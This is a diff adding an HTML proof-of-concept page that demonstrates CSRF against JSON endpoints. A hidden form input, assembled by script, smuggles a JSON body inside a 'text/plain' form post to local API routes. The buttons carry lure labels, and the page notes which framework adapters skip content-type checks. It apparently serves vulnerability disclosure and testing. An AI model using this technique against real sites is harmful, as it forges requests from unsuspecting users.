@@ -1,0 +1,90 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CSRF</title>
+  </head>
+  <body>
+    <p>
+      On modern browsers, executing a CSRF attack to an endpoint that only
+      accepts JSON is only possible if the server is not validating the content
+      type of the request. Or if the server has CORS misconfigured.
+    </p>
+    <p>
+      It's not possible to send a JSON request from a form, so the attacker
+      would have to use JavaScript to send the request. If CORS is properly
+      configured, it's not possible to send a request to a different origin
+      using fetch or XMLHttpRequest.
+    </p>
+    <p>
+      CORS does not prevent posting from a form.
+    </p>
+    <p>
+      This form has a hidden input field that will be look like a JSON object
+      when sent to the server, but the content-type of the request is
+      "text/plain". This endpoint will not validate the content type of the
+      request, so the server will process the request anyway.
+    </p>
+    <form
+      method="post"
+      enctype="text/plain"
+      action="http://localhost:3000/api/giveValue"
+    >
+      <input type="text" hidden />
+      <button type="submit">Click for a cute cat</button>
+    </form>
+    <hr>
+    <p>
+      On this endpoint, the server is validating the content type of the request
+      and only accepts JSON. This means that the server will not process the
+      request if it is not sent as JSON. This is a simple example of how a CSRF
+      attack to an endpoint that only accepts JSON will not work if the server
+      is validating the content type of the request.
+    </p>
+    <form
+      method="post"
+      enctype="text/plain"
+      action="http://localhost:3000/api/saferGiveValue"
+    >
+      <input type="text" hidden />
+      <button type="submit">Instantly earn a million dollars</button>
+    </form>
+    <p>
+      The fetch adapter is already checking the content type of the request and
+      will not send the request if the content type is not JSON, but the Fastify adapter and
+      the Next adapter are not checking the content type of the request.
+    </p>
+    <p>
+      I have not done testing on the other adapters.
+    </p>
+  </body>
+  <script>
+    const forms = document.querySelectorAll("form");
+    forms.forEach((form) => {
+      const input = document.createElement("input");
+
+      const data = {
+        value: 100,
+        username: "a",
+      };
+
+      // Turn data into malicious hidden input field that will send json to the server
+      const name = '{"test": "';
+      const beginValue = '",';
+      const endValue = "}";
+
+      const payloadValue = Object.keys(data)
+        .map((key) => {
+          return '"' + key + '":"' + data[key] + '"';
+        })
+        .join(",");
+
+      input.name = name;
+      input.value = beginValue + payloadValue + endValue;
+      input.hidden = true;
+
+      form.appendChild(input);
+    });
+  </script>
+</html>
